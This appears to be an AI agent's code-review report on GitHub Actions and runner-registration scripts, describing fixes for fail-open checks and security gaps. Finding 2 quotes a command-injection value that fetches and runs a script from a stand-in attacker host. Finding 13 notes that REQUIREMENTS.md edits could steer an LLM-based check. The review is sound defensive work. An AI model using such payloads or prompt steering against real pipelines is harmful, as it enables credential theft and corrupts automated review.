## Method

`/code-review <path>` was recorded going into this review as broken for path targeting in this
environment (silently reviews the ambient worktree diff instead). That held for the Tier 1 security
pass, which fell back to an ordinary hand review. It does not hold here: this repo is two months old
(root commit `36dd95e`, 8,290 lines) with no prior review, so a diff from the root commit against a
review-window commit whose tree matches `origin/main` genuinely **is** the whole codebase as it stands
— the usual "diff instrument can't see a subsystem as-is" objection doesn't bite on a repo this young.
`/code-review high` ran first as a result, and its findings were folded into the same verification
pipeline as everything below — nothing from it was acted on without being independently re-read against
source.

Layered on top: 3 parallel full-corpus hand-review passes (general-purpose agents), each independently
reading every one of the 29 production/CI-meta files in full — not divided between passes, redundant
coverage for recall, matching the security sibling's method. Each pass answered two known-defect-class
questions plus general fail-open correctness:

1. Is there any call whose failure, truncation, or empty result is read as a complete or clean result?
2. Is any PR- or issue-comment-controlled input trusted to influence a merge, suppress, close, or
   deploy decision without authenticating who produced it?

For the self-hosted-runner scripts' fork-PR RCE guard specifically, the card asked that refusal paths
be **executed**, not read: each guard function (`register-gh-runner.sh`'s `refuse_rce()`,
`gh-runner-light-register.sh`'s `refuse()`, `gh-runner-group-setup.sh`'s inline refusals) was run with a
mocked `gh` CLI across ~13 scenarios (public repo, private repo, API error, empty response, unexpected
value, missing group, group allowing public repos, group with unrestricted visibility, failed group-list
read, failed repo-enumeration read, unreadable repo visibility, no private repos) — not just read for
plausibility. That execution is what surfaced finding 1 below; reading alone would have missed it, since
the code *looks* correct and the comments describing its fail-closed intent are accurate — the bug is
in something the comments don't mention at all.

I personally re-read and verified every candidate finding from both `/code-review` and the three hand
passes against actual source before fixing or writing up anything — nothing here is acted on from a
tool or subagent report alone.

**The one pre-recorded finding did not hold.** The card's own text flagged that this repo's canonical
reusable caller-pattern docs show no `permissions:` block, referencing `infra-commons/devops#18` /
`marketing-engine#17`. Checked directly: `docs/azure-deploy.md`'s "Caller shape" already includes the
block, and `.github/workflows/reusable-caller-docs.yml` + `scripts/test_reusable_caller_docs.py` is a
live, comprehensive CI check — glob over every `*-reusable.yml`, verified job-level (not
workflow-level) `permissions:`, with explicit guards against a vacuous pass — that already enforces
exactly this defect class for **every** reusable in the repo, confirmed passing. This was closed by
commits already on `main` (`#18`/`#19`, `#20`, `#23`). Recorded as confirmed-clean; the backlog entry
asserting it is still open is stale.

## Fixed in this PR (9)

Full diffs are in the PR; summarized here for the record.

1. **CRITICAL/security-shaped — `self-hosted-runner/register-gh-runner.sh` +
   `gh-runner-light-register.sh`: the org-scope fork-PR RCE gate could never accept ANY runner group,
   safe or not.** Both scripts stored the `gh api .../runner-groups` response in a shell variable
   literally named `GROUPS`. Bash reserves that name for a special, effectively read-only array
   holding the *calling process's own supplementary group IDs* — assigning to it is silently
   discarded, so `$GROUPS` kept reading back something like `"1000"` (a real GID) instead of the API
   response, and the match against the operator's `--group` name could never succeed. Verified
   directly: `bash -c 'GROUPS="x"; echo "$GROUPS"'` prints a GID, never `"x"`; confirmed against the
   live scripts via `bash -x` trace. Net effect: org-scope registration was fail-closed in the sense
   that it never let an unsafe group through, but *permanently* — a correctly configured, safe,
   `visibility: selected, allows_public_repositories: false` group was refused exactly like an
   unsafe one, with no way to ever pass. That is precisely the shape of guard an operator learns to
   route around: the documented `--i-understand-public` escape hatch — which "also covers the case
   where visibility cannot be read at all" — becomes the only way to ever get org-scope registration
   working, silently disarming the real protection. Fix: renamed to `RUNNER_GROUPS` in both scripts.
   Verified end-to-end by re-running the same ~13 mocked scenarios: a correctly configured group now
   passes the gate; every unsafe/ambiguous/erroring scenario still refuses. New regression test
   (`scripts/test_self_hosted_runner_guards.py`) executes the real shipped scripts via subprocess
   with a mocked `gh`, asserts the accept case now passes, the reject cases still refuse, and that
   neither script assigns to a bare `GROUPS` variable again (word-boundary regex, not substring, so
   it doesn't false-positive on `RUNNER_GROUPS`). This was found by *executing* the refusal paths,
   as the card asked — reading alone would have missed it, since the surrounding code and comments
   describing the fail-closed design are accurate; the bug is a bash-language footgun the comments
   never mention.

2. **CRITICAL/security-shaped — `azure-deploy-reusable.yml`: unvalidated `clients-config` fields
   spliced into a shell `run:` block's Terraform arguments (shell injection).** `llm_model_sonnet`,
   `llm_model_haiku`, `llm_model_opus`, `azure_openai_api_version`, `foundry_account_id`, and the four
   `*_blob` branding fields are cast with `str(...)` only in `load-matrix` — no regex/enum validation,
   unlike their sibling fields (`client_slug`, `tier`, `region`, `environment`, `model`, `operations`,
   `llm_provider` are all regex- or enum-checked a few lines above each of them). Yet the "Terraform
   plan" step spliced all nine directly via `${{ matrix.* }}` into `-var="...="` shell arguments —
   exactly the anti-pattern the very next step in the same file ("Upload client branding assets")
   explicitly warns against in its own comment: *"Blob refs originate in clients-config. Pass them
   through the process ENVIRONMENT, never spliced into the script body with `${{ }}` — a value
   containing backticks, `$()`, `;` etc. would otherwise be interpreted as shell by the runner (which
   holds ARM creds + `CLIENTS_CONFIG_TOKEN`)."* `clients-config` is explicitly treated as a
   less-trusted repo elsewhere in this same file; a crafted value in any of these nine fields (e.g.
   `foundry_account_id: 'x"; curl attacker.sh|bash #'`) would execute arbitrary shell in a job holding
   Azure OIDC deploy credentials and `CLIENTS_CONFIG_TOKEN`. Fix: moved all nine fields to
   `TF_VAR_<name>` environment variables on the step (Terraform's native env-var input mechanism,
   already used correctly for the same fields' sibling values), removing them from the `-var=` shell
   list entirely — mirroring the exact pattern the branding-upload step already established 80 lines
   below. Verified: `scripts/test_azure_deploy_reusable.py` (expression-cap guard) still passes;
   Terraform's `TF_VAR_*` binding is identical in effect to `-var=`, so no `infra/` variable
   declarations needed to change.

3. **`smoke-test-cloudflare.yml`: an empty or malformed `pages` input passes as "All smoke tests
   passed" having tested nothing.** `pages: '[]'` is valid JSON and a valid input per the
   `workflow_call` contract; malformed JSON makes the inline `python3 -c` decoder exit non-zero with
   no stdout. Either way the `while read` loop (fed via process substitution, whose exit status
   `pipefail` does not cover) silently ran zero iterations, `FAIL` stayed `0`, and the step printed
   "All smoke tests passed." — a required check (`smoke-test / smoke-test`, explicitly documented as
   a `required_status_checks` candidate) going green having curled nothing. Fix: added a `TESTED`
   counter incremented per loop iteration; the step now fails loudly with `::error::` if it's zero,
   regardless of *why* the loop ran empty. New regression test
   (`scripts/test_cloudflare_parity_and_smoke.py`) executes the shipped `run:` block via `bash`
   with a stubbed `curl`: confirms a non-empty passing case still passes, a genuine failure still
   fails, and an empty `pages` array is now rejected rather than silently passed.

4. **`cloudflare-env-parity.yml` / `cloudflare-worker-env-parity.yml`: a `success: true` response
   with an unexpected shape reads as "parity confirmed."** Both scripts derive their comparison sets
   via `(data.get("result") or {})...` / `(data.get("result") or [])` chains with no assertion that
   the expected keys were actually present. If Cloudflare's response shape drifts (`result`/
   `deployment_configs` renamed or restructured, or a non-Direct-Upload project shape), both sides
   collapse to the empty set, compare equal, and the check prints "OK — ... (0 vars/secrets)" —
   reproducing, inside the guard itself, the exact silent-drift outage class these checks exist to
   catch (per their own header comment, a multi-day staging outage from an undetected env-var
   difference). Fix: both scripts now explicitly reject a both-sides-empty comparison as ambiguous
   (schema drift or a genuinely unconfigured project, either way not a confirmed match) rather than
   reporting it as OK. New regression test (`scripts/test_cloudflare_parity_and_smoke.py`) execs
   each shipped heredoc in-process with `urllib.request.urlopen` mocked: a real match still passes, a
   real mismatch still fails, and a `success: true` response missing the expected key is now rejected
   instead of read as a match.

5. **`signed-dpa-gate.yml`: a malformed `sub_processors_current_as_of` date crashes the gate instead
   of failing it cleanly.** `datetime.date.fromisoformat(str(sp_str))` was unguarded, contradicting
   the file's own stated guarantee a few lines above ("a malformed block must produce an `::error::`
   the operator can act on, never a traceback"). A non-ISO value (`"TBD"`, `"2024/01/01"`, any typo)
   raised an uncaught `ValueError` — still fail-closed (the deploy step fails either way), but as an
   unexplained traceback rather than an actionable message, and the existing "no input shape crashes
   the gate" hostile-input test suite did not include a malformed-date case despite covering many
   other hostile shapes thoroughly. Fix: wrapped in `try/except ValueError`, reporting the bad value
   via the same `errors.append(...)` path every other malformed field uses. New test cases added to
   the existing hostile-shapes list plus a dedicated test asserting rejection (not crash) and that
   the bad value is named in the output; full suite (27/27) passes.

6. **`traceability_check.py`: no `stop_reason`/truncation guard on the Anthropic call — the 4th and
   5th instance of this family found across the Tier 1 sweep so far.** `message.content[0].text` was
   returned regardless of `message.stop_reason`; a response truncated at `max_tokens` (4096) would
   post to the PR as a complete `## Traceability Report`, with a reviewer seeing no "Misalignments"
   section reading that as "none found" rather than "cut off before reaching it." Found independently
   by all three hand-review passes. Advisory-only (never blocks merge, confirmed via the file's own
   docstring and its reusable caller), so impact is a misleading comment rather than a bypassed gate
   — but it's the exact degraded-result-read-as-clean shape this repo's other guards exist to
   prevent, reproduced in the one check whose entire job is catching drift. Fix: mirrors the shape of
   this same defect's earlier fixes in the sibling repos — check `stop_reason == "max_tokens"` and
   append an explicit cutoff notice to the posted text rather than silently returning it whole. New
   test (`scripts/test_traceability_check.py`) imports the shipped module directly and monkeypatches
   the Anthropic client: a complete response carries no notice, a truncated one does, and the partial
   report itself is preserved (the notice is appended, not substituted).

7. **`cloudflare-deploy-reusable.yml` / `cloudflare-pages-deploy-reusable.yml`: any `environment`
   value other than the exact string `"staging"` silently deploys to production.** Both scripts used
   `if [ "$DEPLOY_ENV" = "staging" ]; then ... else ...`, so a typo, wrong case, or stray space in a
   caller's `environment: staging` (the input is caller-config, not attacker-controlled, but a
   config-level fail-open all the same) fell through to the else branch and deployed to production
   with no warning — unlike this repo's Azure reusable, whose analogous per-client fields are
   regex/enum-validated. Fix: both scripts now use an explicit `case` statement enumerating
   `staging`/`production` and erroring on anything else. New regression test
   (`scripts/test_cloudflare_deploy_environment.py`) execs each shipped `run:` block with a stubbed
   `wrangler`: both valid values still deploy correctly, and a typo is now rejected instead of
   silently landing on production.

8. **`cloudflare-deploy-reusable.yml`: `actions/checkout` pinned to the floating tag `@v6`,
   the only unpinned action reference in the repo.** Every other `actions/checkout` use in this repo
   (13 occurrences across 8 files, including this file's own sibling
   `cloudflare-pages-deploy-reusable.yml`) is SHA-pinned. A floating tag can be repointed upstream;
   in a job holding production Cloudflare deploy credentials, that's a real supply-chain gap, not
   just an inconsistency. Fix: pinned to the exact SHA (`3d3c42e5aac5ba805825da76410c181273ba90b1`,
   `v7.0.1`) already used and trusted elsewhere in this repo, rather than resolving a new SHA myself —
   reusing a pin this repo already carries avoids introducing an unverified one. (Caught via
   `/code-review`; verified by grepping every `actions/checkout@` reference in the repo before and
   after.)

9. **`azure-deploy-reusable.yml`: `terraform state list` failure silently read as "first apply,"
   deferring alert-rule enablement with no warning — found independently by all three hand-review
   passes.** `terraform state list 2>/dev/null | grep -q '...'` made a transient backend failure
   (auth blip, network hiccup) indistinguishable from "resource genuinely not yet in state" — the
   `grep` finds no match either way, so a real error silently took the "first apply, alerts deferred"
   branch on an already-provisioned production app. Not a security bypass (worst case: alerting stays
   off for one run), but a direct match for the "empty/failed result read as a definitive state"
   defect class, and cheap to close. Fix: check `terraform state list`'s own exit status via command
   substitution before grepping its output, failing the step loudly on a real error instead of
   silently deferring alerts. Verified: `scripts/test_azure_deploy_reusable.py` (expression-cap
   guard) still passes.

**What a caller experiences:** every fix above only changes behavior on an already-broken/ambiguous
path — a caller whose `pages`/environment/API responses/dates were already well-formed sees no change
at all. The one exception is finding 2 (shell injection fix): callers see no behavior change either,
since `TF_VAR_*` env vars bind to the same declared Terraform variables `-var=` did.

**Verification:** existing test suites (`test_auto_assign_reusable.py` 18/18,
`test_python_tests_reusable.py` 32/32, `test_reusable_caller_docs.py`, `test_azure_deploy_reusable.py`,

## Non-trivial findings — not fixed here, each needs a design/judgment call

10. **CRITICAL/security-shaped — `azure-deploy-reusable.yml`'s "Security
    review gate" trusts a markdown file with no authentication of who wrote it. Fixed 2026-08-18.**
    The gate (lines
    ~819–945) parses `docs/SECURITY-REVIEW.md` from the calling repo's own checkout for a
    `| Solution | <name> | ... | Result | **PASS** |` table, and is genuinely, carefully hardened
    against *format* gaming — HTML comments and fenced blocks are stripped before matching, and table
    boundaries are parsed to prevent a `#472`-class table-splitting trick (a "Solution" row from one
    table pairing with a "Result" row from an adjacent one). But nothing in this file verifies *who*
    wrote the passing `PASS` row — no signature, no reference to an approving PR review, no
    CODEOWNERS-style enforcement visible from this repo. Anyone who can land that exact markdown text
    on the branch being deployed satisfies the gate; the actual authorization is entirely delegated to
    whatever branch-protection/CODEOWNERS configuration exists in the *calling* repo, which this repo
    cannot see or enforce. This maps to the review's second defect-class question (repo content
    trusted for a deploy decision without authenticating who produced it) directly. **Fix shape:**
    this needs a design decision this repo can't make unilaterally — e.g. require the PASS record to
    reference a specific approved PR/commit this reusable can independently verify via the GitHub API
    (not just trust the file's content), or accept the residual risk explicitly and document that
    callers must enforce CODEOWNERS on `docs/SECURITY-REVIEW.md` themselves. Surfacing for the
    operator to decide which; not fixed here.

    **Fix, 2026-08-18 (operator chose to fix rather than accept the residual).** The parsing/format
    hardening above is untouched. A winning row must now also carry a `| Reviewed-in | #<PR> |`
    field, which the gate verifies independently via the GitHub API (`pull-requests: read`,
    `github.token` scoped to the calling repo): the PR is merged; its diff actually touches
    `docs/SECURITY-REVIEW.md` (closes a laundering path where an unrelated later approved PR could
    be cited against a once-only, unreviewed direct-pushed edit); the file in the checkout is
    byte-identical (git blob SHA1) to the file as it stood at that PR, the same pin-to-an-exact-
    artifact logic the cosign digest check already uses; and the PR carries an `APPROVED` review
    from a login other than its own author. **Residual, stated plainly, not "solved":** this cannot
    confirm the approver was a qualified reviewer or CODEOWNER for this file — any collaborator with
    review-approve rights on the calling repo satisfies it, and a solo-operator repo can still defeat
    "distinct login" with a second identity. It moves the trust boundary from "arbitrary file
    content" to "an independently-verified merged, approved PR"; it does not remove the calling
    repo's own governance from the picture. Zero live callers today (confirmed by search across
    `rolliq-com` and `infra-commons`), so this is a contract addition, not a live break — but it does
    require a caller's `permissions:` to add `pull-requests: read` and its review entries to carry
    `Reviewed-in`. Verified: new `scripts/test_security_review_gate.py` (positive control + 10
    negative controls, wired into CI via `security-review-gate-self-test.yml`), plus a manual
    mutation check (disabling the hash-match and distinct-approver clauses in turn) confirming the
    corresponding negative controls actually turn red — the same execution-based verification
    finding 1 in this document required. `docs/azure-deploy.md` documents the new `Reviewed-in`
    field and permission for adopters. Not done here, flagged for the operator: updating
    `rolliq-com/solution-template`'s own `SECURITY-REVIEW.md`/`REVIEW-CHECKLIST.md` templates to the
    new field.

11. **CRITICAL/security-shaped — `self-hosted-runner/register-ado-agent.sh`
    has no visibility/exposure gate, unlike its three GitHub-runner siblings. Fixed 2026-08-18.**
    `register-gh-runner.sh`, `gh-runner-light-register.sh`, and `gh-runner-group-setup.sh` all
    explicitly refuse to register against a public/unrestricted-visibility target, fail closed on an
    unreadable API response, and document the fork-PR-RCE rationale at length. `register-ado-agent.sh`
    has none of that — it registers unconditionally against whatever `--org`/`--pool` is passed. Azure
    DevOps's default posture differs materially from GitHub's (fork-PR builds don't get secrets unless
    an admin explicitly opts in via "Make secrets available to builds of forks"), which is why this
    likely reads as lower-severity than the GitHub-side gap would — but arbitrary code execution from
    an untrusted contributor on the agent host (network/host pivot, resource abuse, reading whatever
    local state the agent process itself holds) is a real risk this script does not guard against at
    all, on a public or externally-contributable ADO project. **Fix shape:** needs a design decision
    on what the correct ADO-specific check actually is (the ADO REST API exposes project
    `visibility: private|public`, but the *fork-secret-exposure* toggle — the actual attack-relevant
    setting — is a separate, not-obviously-queryable-the-same-way org policy) before writing a gate;
    porting the GitHub scripts' pattern verbatim would check the wrong thing. Not fixed here — this is
    a genuine gap, not a false alarm, and deserves deliberate design rather than a rushed port.
    **Fix (`#26`, merged 2026-08-18):** the design question above resolved the *opposite* way to what
    this finding predicted — the attack-relevant setting **is** queryable. Azure DevOps exposes a
    project-scoped `generalsettings` endpoint carrying `buildsEnabledForForks` (the literal
    "build PRs from forks" toggle, decisive because it gates whether fork code runs at all,
    independent of secrets) alongside `enforceNoAccessToSecretsFromForks`. The gate therefore checks
    the real toggle rather than project visibility alone: a repeatable `--project` flag is required
    (an ADO pool commonly serves several projects, so there is no single-repo analog), and per project
    it refuses unless `visibility` is `private` **and** `buildsEnabledForForks` is `false`. It fails
    closed on a missing `az`, an unreadable API response, or no `--project` at all;
    `--i-understand-public` remains the override, same name and shape as the GitHub siblings.
    **Finding 12 is untouched and no third copy was added** — the ADO gate is a different API surface
    (`az devops` vs `gh api`), not a port, and there is only one ADO script to de-duplicate against.
    **Verified:** new `scripts/test_ado_agent_gate.py` (9 cases) executes the real script via
    subprocess against a mocked `az`, including the case a visibility-only port would have passed —
    a private project with `buildsEnabledForForks=true`, correctly refused. Note the suite initially
    passed for the wrong reason: this box has a real `az` installed which leaked into the
    "`az` is missing" case, so the tests were rebuilt on a hermetic `PATH`. That is the same class as
    finding 1 — a gate nobody had actually executed. **Residual:** a project added to the pool's
    authorization *after* registration is not covered and needs its own check.

12. **Non-trivial, DRY/maintainability — the fork-PR RCE gate is duplicated near-verbatim across
    `register-gh-runner.sh` and `gh-runner-light-register.sh`, with no shared source.** Confirmed by
    finding 1 above: the identical `GROUPS` bug existed in both copies simultaneously, because there's
    no `lib.sh` or sourcing mechanism tying them together — a future fix (or future bug) applied to
    one silently doesn't reach the other. **Fix shape:** extract the repo-visibility and
    runner-group-visibility checks into a shared sourced file both scripts pull in; not attempted here
    since it touches the security-critical execution path of both scripts and deserves its own
    focused pass with the same execution-based verification finding 1 used, not a rushed refactor
    bundled into this PR.

13. **Non-trivial, low-priority — `traceability_check.py` passes `REQUIREMENTS.md`/ADR content to the
    LLM with no injection-hardening, and paginates PR-comment cleanup at only 100 comments.** The
    traceability job runs for any same-repo (non-fork, non-Dependabot) PR, so an internal contributor
    could edit `REQUIREMENTS.md` in their own PR to try to steer the model's output (e.g. toward "no
    misalignments"); `delete_previous_comments` only fetches the first page of PR comments, so a stale
    marker-tagged comment beyond page 1 on a >100-comment PR wouldn't be cleaned up (a new one posts
    alongside it). Both are low severity — the check is advisory-only and never gates merge either
    way — and likely accepted risk given that framing, but recorded per the review's recall-over-
    precision instruction rather than silently dropped.
